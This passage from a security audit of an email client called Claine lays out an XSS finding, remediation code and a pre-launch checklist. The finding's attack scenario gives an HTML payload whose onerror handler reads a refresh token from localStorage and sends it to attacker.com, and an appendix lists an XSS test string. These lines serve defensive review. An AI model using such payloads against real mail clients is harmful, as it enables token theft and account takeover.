      dangerouslySetInnerHTML={{ __html: html }}
      // NO sanitization!
    />
  );
}
```

**Attack Scenario**:
1. Attacker sends email with malicious HTML:
```html
<img src=x onerror="
  const token = localStorage.getItem('gis_refresh_token');
  fetch('https://attacker.com/steal?token=' + token);
">
```
2. User opens email in Claine
3. Malicious script executes
4. Refresh token exfiltrated to attacker

**Impact**:
- XSS attack vector
- Token theft (S-01)
- Full account compromise

**Recommendation**:
```typescript
import DOMPurify from 'dompurify';

function EmailBody({ html }: { html: string }) {
  const sanitized = DOMPurify.sanitize(html, {
    // Allow safe HTML elements
    ALLOWED_TAGS: [
      'p', 'br', 'div', 'span', 'strong', 'em', 'u', 'i', 'b',
      'a', 'img', 'ul', 'ol', 'li', 'blockquote', 'pre', 'code',
      'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'table', 'tr', 'td', 'th'
    ],
    // Allow safe attributes
    ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class', 'style'],
    // Block JavaScript URLs
    ALLOW_DATA_ATTR: false,
    FORBID_TAGS: ['script', 'iframe', 'object', 'embed'],
    FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover']
  });

  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

---

## 8. Security Recommendations for v2

### 8.1 Critical Fixes (P0 - Must Have)

#### 1. Implement Secure Token Storage

**Priority**: P0
**Effort**: Medium (2-3 days)
**Impact**: Critical security improvement

**Implementation**:
```typescript
// Backend proxy for OAuth tokens
app.post('/api/auth/gmail/exchange', async (req, res) => {
  const { code } = req.body;

  // Exchange authorization code for tokens
  const { access_token, refresh_token, expires_in } =
    await exchangeCodeForTokens(code);

  // Encrypt refresh token
  const encryptedRefreshToken = await encrypt(refresh_token, SERVER_KEY);

  // Store in database with user association
  await db.collection('tokens').insertOne({
    userId: req.user.userId,
    refreshToken: encryptedRefreshToken,
    createdAt: new Date(),
    expiresAt: null  // Refresh tokens don't expire automatically
  });

  // Return access token only (short-lived)
  res.json({
    access_token,
    expires_in
  });
});

// Client stores access token in memory only
class TokenManager {
  private accessToken: string | null = null;
  private tokenExpiresAt: number = 0;

  public setAccessToken(token: string, expiresIn: number): void {
    this.accessToken = token;
    this.tokenExpiresAt = Date.now() + (expiresIn * 1000);
  }

  public async getAccessToken(): Promise<string> {
    if (this.isExpired()) {
      // Request new access token from backend
      const response = await fetch('/api/auth/gmail/refresh', {
        method: 'POST',
        credentials: 'include'  // Sends session cookie
      });

      const { access_token, expires_in } = await response.json();
      this.setAccessToken(access_token, expires_in);
    }

    return this.accessToken;
  }

  private isExpired(): boolean {
    return Date.now() >= this.tokenExpiresAt - (5 * 60 * 1000);  // 5 min buffer
  }
}
```

**Benefits**:
- ✅ Refresh tokens never exposed to client-side JavaScript
- ✅ Even if XSS occurs, attacker only gets short-lived access token
- ✅ Server can revoke/rotate refresh tokens
- ✅ Audit log of token usage

#### 2. Eliminate Default Secrets

**Priority**: P0
**Effort**: Low (1 day)
**Impact**: Prevents complete authentication bypass

**Implementation**:
```typescript
// 1. Environment validation at startup
function validateEnvironment(): void {
  const required = [
    'JWT_SECRET',
    'GOOGLE_CLIENT_ID',
    'GOOGLE_CLIENT_SECRET',
    'DATABASE_URL'
  ];

  const missing = required.filter(key => !process.env[key]);

  if (missing.length > 0) {
    console.error(`Missing required environment variables: ${missing.join(', ')}`);
    process.exit(1);  // Fail fast
  }

  // Validate JWT_SECRET is strong
  const jwtSecret = process.env.JWT_SECRET!;
  if (jwtSecret.length < 32) {
    console.error('JWT_SECRET must be at least 32 characters');
    process.exit(1);
  }

  if (jwtSecret === 'default-secret-key') {
    console.error('JWT_SECRET cannot be default value');
    process.exit(1);
  }
}

// Call at startup
validateEnvironment();

// 2. Secret generation script
// scripts/generate-secrets.sh
#!/bin/bash

echo "Generating secure secrets..."

JWT_SECRET=$(openssl rand -base64 64 | tr -d '\n')
DATABASE_ENCRYPTION_KEY=$(openssl rand -base64 32 | tr -d '\n')

cat > .env.production << EOF
JWT_SECRET=${JWT_SECRET}
DATABASE_ENCRYPTION_KEY=${DATABASE_ENCRYPTION_KEY}
GOOGLE_CLIENT_ID=your-client-id-here
GOOGLE_CLIENT_SECRET=your-client-secret-here
DATABASE_URL=your-database-url-here
NODE_ENV=production
EOF

echo "Secrets generated in .env.production"
echo "⚠️  Store these secrets in your deployment platform's secret manager"
echo "⚠️  NEVER commit .env.production to version control"
```

#### 3. Fix CORS Configuration

**Priority**: P0
**Effort**: Low (1 hour)
**Impact**: Prevents CSRF and unauthorized access

**Implementation**: See S-03 recommendation above.

### 8.2 High Priority Fixes (P1 - Should Have)

#### 4. Implement Content Security Policy

**Priority**: P1
**Effort**: Medium (1-2 days)
**Impact**: Defense-in-depth against XSS

**Implementation**:
```typescript
// Use helmet middleware
import helmet from 'helmet';

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: [
      "'self'",
      "'unsafe-inline'",  // Required for React dev mode only
      "https://accounts.google.com",
      "https://apis.google.com"
    ],
    styleSrc: [
      "'self'",
      "'unsafe-inline'",  // Required for styled-components
      "https://fonts.googleapis.com"
    ],
    imgSrc: [
      "'self'",
      "data:",
      "https:",  // Allow images from any HTTPS source (for emails)
      "blob:"
    ],
    connectSrc: [
      "'self'",
      "https://gmail.googleapis.com",
      "https://oauth2.googleapis.com",
      "https://www.googleapis.com"
    ],
    fontSrc: [
      "'self'",
      "https://fonts.gstatic.com"
    ],
    frameSrc: [
      "'none'"  // No iframes allowed
    ],
    objectSrc: ["'none'"],  // No plugins
    upgradeInsecureRequests: []  // Force HTTPS
  }
}));
```

#### 5. Sanitize HTML Content

**Priority**: P1
**Effort**: Low (1 day)
**Impact**: Prevents XSS via malicious emails

**Implementation**: See S-05 recommendation above.

#### 6. Add Rate Limiting

**Priority**: P1
**Effort**: Low (1 day)
**Impact**: Prevents brute force and DoS attacks

**Implementation**:
```typescript
import rateLimit from 'express-rate-limit';

// Strict rate limit for authentication
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 5,
  message: 'Too many login attempts, please try again later',
  standardHeaders: true,
  legacyHeaders: false,
  skipSuccessfulRequests: true  // Don't count successful logins
});

// General API rate limit
const apiLimiter = rateLimit({
  windowMs: 60 * 1000,  // 1 minute
  max: 100,
  message: 'Too many requests, please slow down'
});

// Apply to routes
app.post('/api/auth/login', authLimiter, loginHandler);
app.post('/api/auth/register', authLimiter, registerHandler);
app.use('/api/', apiLimiter);  // All API routes
```

### 8.3 Medium Priority Improvements (P2 - Nice to Have)

#### 7. Implement Encryption at Rest

**Priority**: P2
**Effort**: High (1 week)
**Impact**: Protects data in case of device compromise

**Implementation**:
```typescript
// RxDB encryption plugin
import { wrappedKeyEncryptionCryptoJsStorage } from 'rxdb/plugins/encryption-crypto-js';
import { getRxStorageDexie } from 'rxdb/plugins/storage-dexie';

// Derive encryption key from user password
async function deriveEncryptionKey(password: string, salt: string): Promise<string> {
  const encoder = new TextEncoder();
  const keyMaterial = await window.crypto.subtle.importKey(
    'raw',
    encoder.encode(password),
    'PBKDF2',
    false,
    ['deriveBits']
  );

  const key = await window.crypto.subtle.deriveBits(
    {
      name: 'PBKDF2',
      salt: encoder.encode(salt),
      iterations: 100000,
      hash: 'SHA-256'
    },
    keyMaterial,
    256
  );

  return Buffer.from(key).toString('hex');
}

// Create encrypted database
const db = await createRxDatabase({
  name: 'claine_db',
  storage: wrappedKeyEncryptionCryptoJsStorage({
    storage: getRxStorageDexie()
  }),
  password: await deriveEncryptionKey(userPassword, userId),  // User-specific key
  multiInstance: true
});
```

**Considerations**:
- User must enter password on each app start
- Forgot password = data loss (unless backup exists)
- Performance impact (~10-20% slower queries)
- Increased battery usage on mobile

#### 8. Implement Session Management

**Priority**: P2
**Effort**: Medium (2-3 days)
**Impact**: Better control over active sessions

**Implementation**:
```typescript
// Session model
interface Session {
  id: string;
  userId: string;
  jwtToken: string;
  createdAt: Date;
  expiresAt: Date;
  lastActivityAt: Date;
  ipAddress: string;
  userAgent: string;
  isActive: boolean;
}

// Session service
class SessionService {
  // Create session on login
  async createSession(userId: string, token: string, req: Request): Promise<Session> {
    const session: Session = {
      id: generateId(),
      userId,
      jwtToken: hashToken(token),  // Store hash, not plaintext
      createdAt: new Date(),
      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
      lastActivityAt: new Date(),
      ipAddress: req.ip,
      userAgent: req.headers['user-agent'] || 'unknown',
      isActive: true
    };

    await db.collection('sessions').insertOne(session);
    return session;
  }

  // Validate session on each request
  async validateSession(token: string): Promise<boolean> {
    const tokenHash = hashToken(token);
    const session = await db.collection('sessions').findOne({
      jwtToken: tokenHash,
      isActive: true,
      expiresAt: { $gt: new Date() }
    });

    if (!session) {
      return false;
    }

    // Update last activity
    await db.collection('sessions').updateOne(
      { id: session.id },
      { $set: { lastActivityAt: new Date() } }
    );

    return true;
  }

  // Revoke session (logout)
  async revokeSession(token: string): Promise<void> {
    const tokenHash = hashToken(token);
    await db.collection('sessions').updateOne(
      { jwtToken: tokenHash },
      { $set: { isActive: false } }
    );
  }

  // Revoke all sessions (logout everywhere)
  async revokeAllUserSessions(userId: string): Promise<void> {
    await db.collection('sessions').updateMany(
      { userId },
      { $set: { isActive: false } }
    );
  }

  // List active sessions
  async getUserSessions(userId: string): Promise<Session[]> {
    return db.collection('sessions')
      .find({ userId, isActive: true })
      .sort({ lastActivityAt: -1 })
      .toArray();
  }
}
```

#### 9. Add Security Audit Logging

**Priority**: P2
**Effort**: Medium (2-3 days)
**Impact**: Detection and forensics

**Implementation**:
```typescript
// Security event types
enum SecurityEventType {
  LOGIN_SUCCESS = 'login_success',
  LOGIN_FAILURE = 'login_failure',
  LOGOUT = 'logout',
  TOKEN_REFRESH = 'token_refresh',
  TOKEN_REVOKE = 'token_revoke',
  PASSWORD_CHANGE = 'password_change',
  OAUTH_GRANT = 'oauth_grant',
  OAUTH_REVOKE = 'oauth_revoke',
  SUSPICIOUS_ACTIVITY = 'suspicious_activity',
  RATE_LIMIT_EXCEEDED = 'rate_limit_exceeded'
}

// Audit log entry
interface SecurityAuditLog {
  id: string;
  userId: string | null;
  eventType: SecurityEventType;
  timestamp: Date;
  ipAddress: string;
  userAgent: string;
  success: boolean;
  details: Record<string, any>;
  riskScore: number;  // 0-100
}

// Audit logger
class SecurityAuditLogger {
  async log(event: Omit<SecurityAuditLog, 'id' | 'timestamp'>): Promise<void> {
    const auditLog: SecurityAuditLog = {
      id: generateId(),
      timestamp: new Date(),
      ...event
    };

    // Write to database
    await db.collection('security_audit_log').insertOne(auditLog);

    // Alert on high-risk events
    if (auditLog.riskScore > 75) {
      await this.sendSecurityAlert(auditLog);
    }
  }

  // Detect suspicious patterns
  async checkSuspiciousActivity(userId: string, ipAddress: string): Promise<number> {
    const recentLogs = await db.collection('security_audit_log')
      .find({
        userId,
        timestamp: { $gt: new Date(Date.now() - 60 * 60 * 1000) }  // Last hour
      })
      .toArray();

    let riskScore = 0;

    // Multiple IPs in short time
    const uniqueIps = new Set(recentLogs.map(log => log.ipAddress));
    if (uniqueIps.size > 3) {
      riskScore += 40;
    }

    // Many failed logins
    const failedLogins = recentLogs.filter(
      log => log.eventType === SecurityEventType.LOGIN_FAILURE
    );
    if (failedLogins.length > 5) {
      riskScore += 50;
    }

    // Unusual time (2am-6am)
    const hour = new Date().getHours();
    if (hour >= 2 && hour < 6) {
      riskScore += 20;
    }

    return Math.min(riskScore, 100);
  }
}

// Usage in authentication
app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;

  try {
    const user = await authenticateUser(email, password);

    // Check for suspicious activity
    const riskScore = await auditLogger.checkSuspiciousActivity(
      user.id,
      req.ip
    );

    if (riskScore > 75) {
      // Require additional verification
      return res.status(403).json({
        error: 'Additional verification required',
        requiresMfa: true
      });
    }

    // Log success
    await auditLogger.log({
      userId: user.id,
      eventType: SecurityEventType.LOGIN_SUCCESS,
      ipAddress: req.ip,
      userAgent: req.headers['user-agent'],
      success: true,
      details: { email },
      riskScore
    });

    // Generate token...
  } catch (error) {
    // Log failure
    await auditLogger.log({
      userId: null,
      eventType: SecurityEventType.LOGIN_FAILURE,
      ipAddress: req.ip,
      userAgent: req.headers['user-agent'],
      success: false,
      details: { email, error: error.message },
      riskScore: 25
    });

    return res.status(401).json({ error: 'Invalid credentials' });
  }
});
```

### 8.4 Low Priority Enhancements (P3 - Future)

#### 10. Multi-Factor Authentication

**Priority**: P3
**Effort**: High (2 weeks)
**Impact**: Additional account security

**Implementation**:
```typescript
// TOTP-based MFA using speakeasy
import speakeasy from 'speakeasy';
import QRCode from 'qrcode';

// Enable MFA for user
app.post('/api/auth/mfa/enable', authenticateJWT, async (req, res) => {
  const secret = speakeasy.generateSecret({
    name: `Claine (${req.user.email})`,
    issuer: 'Claine'
  });

  // Generate QR code for authenticator app
  const qrCode = await QRCode.toDataURL(secret.otpauth_url);

  // Store secret (encrypted) in database
  await db.collection('users').updateOne(
    { id: req.user.userId },
    {
      $set: {
        mfaSecret: encrypt(secret.base32),
        mfaEnabled: false  // Not enabled until verified
      }
    }
  );

  res.json({
    secret: secret.base32,
    qrCode
  });
});

// Verify and activate MFA
app.post('/api/auth/mfa/verify', authenticateJWT, async (req, res) => {
  const { token } = req.body;

  const user = await db.collection('users').findOne({ id: req.user.userId });
  const secret = decrypt(user.mfaSecret);

  const verified = speakeasy.totp.verify({
    secret,
    encoding: 'base32',
    token,
    window: 2  // Allow 2 time steps tolerance
  });

  if (verified) {
    await db.collection('users').updateOne(
      { id: req.user.userId },
      { $set: { mfaEnabled: true } }
    );

    res.json({ success: true });
  } else {
    res.status(400).json({ error: 'Invalid token' });
  }
});

// Login with MFA
app.post('/api/auth/login', async (req, res) => {
  const { email, password, mfaToken } = req.body;

  const user = await authenticateUser(email, password);

  if (user.mfaEnabled) {
    if (!mfaToken) {
      return res.status(200).json({
        requiresMfa: true,
        message: 'Please provide MFA token'
      });
    }

    const secret = decrypt(user.mfaSecret);
    const verified = speakeasy.totp.verify({
      secret,
      encoding: 'base32',
      token: mfaToken,
      window: 2
    });

    if (!verified) {
      return res.status(401).json({ error: 'Invalid MFA token' });
    }
  }

  // Generate JWT...
});
```

#### 11. GDPR Compliance Features

**Priority**: P3
**Effort**: High (2-3 weeks)
**Impact**: Legal compliance, user trust

**Implementation**:
```typescript
// Data export (GDPR Article 15)
app.get('/api/user/data-export', authenticateJWT, async (req, res) => {
  const userId = req.user.userId;

  // Gather all user data
  const userData = {
    profile: await db.collection('users').findOne({ id: userId }),
    workflows: await db.collection('workflows').find({ userId }).toArray(),
    attributes: await db.collection('attributes').find({ userId }).toArray(),
    sessions: await db.collection('sessions').find({ userId }).toArray(),
    auditLogs: await db.collection('security_audit_log').find({ userId }).toArray()
  };

  // Note: Gmail data is NOT stored on server, instruct user to export from Google
  userData.note = 'Email data is stored locally on your device. To export Gmail data, visit Google Takeout.';

  // Generate JSON file
  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Content-Disposition', 'attachment; filename=claine-data-export.json');
  res.json(userData);
});

// Account deletion (GDPR Article 17)
app.delete('/api/user/account', authenticateJWT, async (req, res) => {
  const { password, confirmation } = req.body;

  if (confirmation !== 'DELETE MY ACCOUNT') {
    return res.status(400).json({ error: 'Confirmation text required' });
  }

  const user = await db.collection('users').findOne({ id: req.user.userId });
  const validPassword = await bcrypt.compare(password, user.password);

  if (!validPassword) {
    return res.status(401).json({ error: 'Invalid password' });
  }

  // Revoke Gmail OAuth tokens
  await revokeGoogleOAuthToken(user.gmailRefreshToken);

  // Delete all user data
  await db.collection('users').deleteOne({ id: req.user.userId });
  await db.collection('workflows').deleteMany({ userId: req.user.userId });
  await db.collection('attributes').deleteMany({ userId: req.user.userId });
  await db.collection('sessions').deleteMany({ userId: req.user.userId });
  await db.collection('tokens').deleteMany({ userId: req.user.userId });

  // Anonymize audit logs (can't delete for compliance)
  await db.collection('security_audit_log').updateMany(
    { userId: req.user.userId },
    { $set: { userId: 'DELETED_USER', details: { anonymized: true } } }
  );

  res.json({ success: true, message: 'Account deleted successfully' });
});
```

---

## 9. Security Checklist for v2

### Pre-Launch Security Checklist

- [ ] **Authentication & Authorization**
  - [ ] OAuth tokens stored securely (httpOnly cookies or encrypted backend storage)
  - [ ] No default secrets in code
  - [ ] JWT secrets are strong, random, and environment-specific
  - [ ] Password strength requirements enforced (min 12 chars, complexity)
  - [ ] Account lockout after 5 failed login attempts
  - [ ] Session management implemented with revocation capability
  - [ ] MFA available (optional for v2.0, required for v2.1)

- [ ] **Data Security**
  - [ ] Encryption at rest for sensitive data (optional for v2.0)
  - [ ] HTTPS enforced in production
  - [ ] HSTS headers configured (1 year, includeSubDomains)
  - [ ] TLS 1.3 minimum version
  - [ ] Certificate pinning (mobile apps only)

- [ ] **Input Validation & Output Encoding**
  - [ ] All HTML content sanitized (DOMPurify)
  - [ ] SQL injection prevented (using parameterized queries)
  - [ ] NoSQL injection prevented (input validation)
  - [ ] File upload validation (type, size, content)
  - [ ] URL validation for external links

- [ ] **Network Security**
  - [ ] CORS configured with specific origins
  - [ ] Content Security Policy (CSP) implemented
  - [ ] Rate limiting on all endpoints
  - [ ] Aggressive rate limiting on auth endpoints (5 req/15 min)
  - [ ] No sensitive data in URLs or query strings
  - [ ] No credentials in client-side code

- [ ] **Privacy & Compliance**
  - [ ] Privacy policy published and linked in UI
  - [ ] Data export capability (GDPR Article 15)
  - [ ] Account deletion capability (GDPR Article 17)
  - [ ] User consent tracking for workflow replication
  - [ ] Data retention policy defined and implemented
  - [ ] Minimal data collection principle followed

- [ ] **Monitoring & Incident Response**
  - [ ] Security audit logging for all authentication events
  - [ ] Anomaly detection for suspicious activity
  - [ ] Alert system for high-risk events
  - [ ] Incident response plan documented
  - [ ] Regular security log review process

- [ ] **Development Practices**
  - [ ] Security code review checklist
  - [ ] Dependency vulnerability scanning (npm audit, Snyk)
  - [ ] Automated security testing in CI/CD
  - [ ] Secrets never committed to version control
  - [ ] .env files in .gitignore
  - [ ] Security headers validated (securityheaders.com)

---

## 10. Appendix

### A. Security Testing Recommendations

**Manual Testing**:
1. **XSS Testing**: Try injecting `<script>alert('XSS')</script>` in all input fields
2. **CSRF Testing**: Make API calls from different origin with credentials
3. **Token Theft Testing**: Inspect localStorage for sensitive tokens
4. **Session Management**: Test logout, concurrent sessions, session expiration
5. **Password Reset**: Test reset flow for vulnerabilities

**Automated Testing Tools**:
- **OWASP ZAP**: Web application security scanner
- **npm audit**: Dependency vulnerability scanning
- **Snyk**: Continuous security monitoring
- **SonarQube**: Code quality and security analysis
- **Burp Suite**: Professional web security testing

### B. Security Resources

**Standards & Frameworks**:
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- NIST Cybersecurity Framework: https://www.nist.gov/cyberframework
- CWE Top 25: https://cwe.mitre.org/top25/

**OAuth 2.0 Best Practices**:
- OAuth 2.0 Security Best Current Practice: https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics
- RFC 6749 (OAuth 2.0): https://www.rfc-editor.org/rfc/rfc6749

**JWT Best Practices**:
- RFC 7519 (JWT): https://www.rfc-editor.org/rfc/rfc7519
- RFC 8725 (JWT Best Practices): https://www.rfc-editor.org/rfc/rfc8725

### C. Severity Rating Methodology

**CVSS 3.1 Scoring**:
- **0.0**: None
- **0.1-3.9**: Low
- **4.0-6.9**: Medium
- **7.0-8.9**: High
- **9.0-10.0**: Critical

**Priority Definitions**:
- **P0 (Critical)**: Must fix before launch, CVSS 7.0+, exploitable, high impact
- **P1 (High)**: Should fix before launch, CVSS 4.0-6.9, defense-in-depth
- **P2 (Medium)**: Nice to have, CVSS 0.1-3.9, best practices
- **P3 (Low)**: Future enhancement, security hardening, compliance

---

**Document End**

For v2 implementation, prioritize fixes in order: P0 → P1 → P2 → P3. All P0 issues must be resolved before production deployment.
